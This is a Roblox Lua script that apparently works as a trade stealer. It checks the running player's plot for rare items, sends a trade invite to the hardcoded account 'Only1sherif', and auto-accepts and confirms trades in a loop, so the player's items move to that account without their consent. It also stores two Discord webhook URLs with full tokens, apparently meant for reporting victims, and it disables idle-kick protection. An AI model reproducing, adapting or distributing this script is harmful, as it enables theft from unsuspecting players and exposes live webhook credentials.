if game.PlaceId ~= 109983668079237 then return end

getgenv().WEBHOOK_URL2 = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"
getgenv().WEBHOOKSHERIF = "https://discord.com/api/webhooks/1490063982760038440/CLhsVX58Yl-Xd5ZqG8kiSqEoNl9NoV4A1SDQXsjOVGJQNGOdfYlk-OetI7XGas0QirJd"

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer.PlayerGui

local MY_USER = "Only1sherif"

local wantedItems = {
    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
}

for i, v in pairs(getconnections(LocalPlayer.Idled)) do
    if v.Disable then v:Disable() end
end

local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
local function getRemote(name)
    local children = Net:GetChildren()
    for i, obj in ipairs(children) do if obj.Name == name then return children[i+1] end end
    return nil
end

local readyRE = getRemote("RE/TradeService/Ready")
local acceptRE = getRemote("RE/TradeService/Accept")

local function scanPlot()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local myPlot = nil
    for _, p in ipairs(plots:GetChildren()) do
        local sign = p:FindFirstChild("PlotSign")
        if sign then
            local lbl = sign:FindFirstChildOfClass("SurfaceGui", true):FindFirstChildOfClass("TextLabel", true)
            if lbl and (lbl.Text:lower():find(LocalPlayer.Name:lower()) or lbl.Text:lower():find(LocalPlayer.DisplayName:lower())) then
                myPlot = p
                break
            end
        end
    end
    if myPlot then
        for _, child in ipairs(myPlot:GetChildren()) do
            if child:IsA("Model") then
                for _, wanted in ipairs(wantedItems) do
                    if child.Name:lower():find(wanted:lower()) then return true end
                end
            end
        end
    end
    return false
end

local function handleIncomingRequests()
    local reqUI = PlayerGui:FindFirstChild("TradeInviteReceived")
    if reqUI and reqUI.Enabled then
        local btn = reqUI:FindFirstChild("Accept", true)
        if btn and btn.Visible then
            pcall(function() firesignal(btn.Activated) end)
        end
    end
end

local function sendInvite()
    local tl = PlayerGui:FindFirstChild("TradePlayerList")
    if tl and tl:FindFirstChild("TradePlayerList") then
        local inner = tl.TradePlayerList
        local sb = inner.bg.SearchFrame.SearchBox
        sb.Text = MY_USER
        task.wait(0.5)
        pcall(function() firesignal(sb.FocusLost, true) end)
        task.wait(0.5)
        local list = inner:FindFirstChild("Global") and inner.Global:FindFirstChild("List")
        if list then
            for _, p in pairs(list:GetChildren()) do
                if p:IsA("Frame") and p:FindFirstChild("Fill") then
                    local nameLbl = p.Fill:FindFirstChild("Username")
                    if nameLbl and nameLbl.Text:find(MY_USER) then
                        local send = p.Fill:FindFirstChild("Send")
                        if send then
                            pcall(function() firesignal(send.Activated) end)
                            return true
                        end
                    end
                end
            end
        end
    end
    return false
end

task.spawn(function()
    while true do
        pcall(function()
            local tradeUI = PlayerGui:FindFirstChild("TradeLiveTrade")
            
            handleIncomingRequests()

            if tradeUI and tradeUI.Enabled then
                if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
                task.wait(0.8)
                if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
            else
                if scanPlot() then
                    sendInvite()
                end
            end
        end)
        task.wait(1.5)
    end
end)
